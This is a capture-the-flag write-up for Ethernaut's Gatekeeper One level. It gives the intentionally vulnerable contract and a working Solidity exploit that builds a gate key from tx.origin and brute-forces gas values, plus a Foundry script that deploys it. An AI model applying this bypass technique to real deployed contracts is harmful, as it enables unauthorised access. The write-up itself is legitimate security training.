# Level 13 - Gatekeeper 1 ⏺⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/13" %}

### Level Setup

{% hint style="info" %}
Make it past the gatekeeper and register as an entrant to pass this level.

**Things that might help:**

* Remember what you've learned from the Telephone and Token levels.
* You can learn more about the special function `gasleft()`, in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/GatekeeperOne.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-13

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-13

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/4dc2126006371c28e6945efa78c79b6a68f96b06/src/Level13.sol" %}

{% code title="src/Level13.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

// ================================================================
// │                    LEVEL 13 - GATEKEEPER ONE                 │
// ================================================================
contract GatekeeperOneMiddleman {
    function run(address targetContract) public {
        // Gate one is passed just by calling the enter function from this contract
        // causing the tx.origin to be different from the msg.sender

        bool succeeded = false;

        // Gate three requires...
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);

        uint256 gas = 65782;

        // Gate two requires calculating the gas remaining...
        for (uint256 i = gas - 5052; i < gas + 5052; i++) {
            console.log("Trying gas: ", i);
            (bool success,) = address(targetContract).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                succeeded = success;
                break;
            }
        }
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/4dc2126006371c28e6945efa78c79b6a68f96b06/script/Level13.s.sol" %}

{% code title="script/Level13.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {GatekeeperOneMiddleman} from "../src/Level13.sol";

// ================================================================
// │                    LEVEL 13 - GATEKEEPER ONE                 │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        GatekeeperOneMiddleman gatekeeperOneMiddleman = new GatekeeperOneMiddleman();
        gatekeeperOneMiddleman.run(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Well done! Next, try your hand with the second gatekeeper...
{% endhint %}
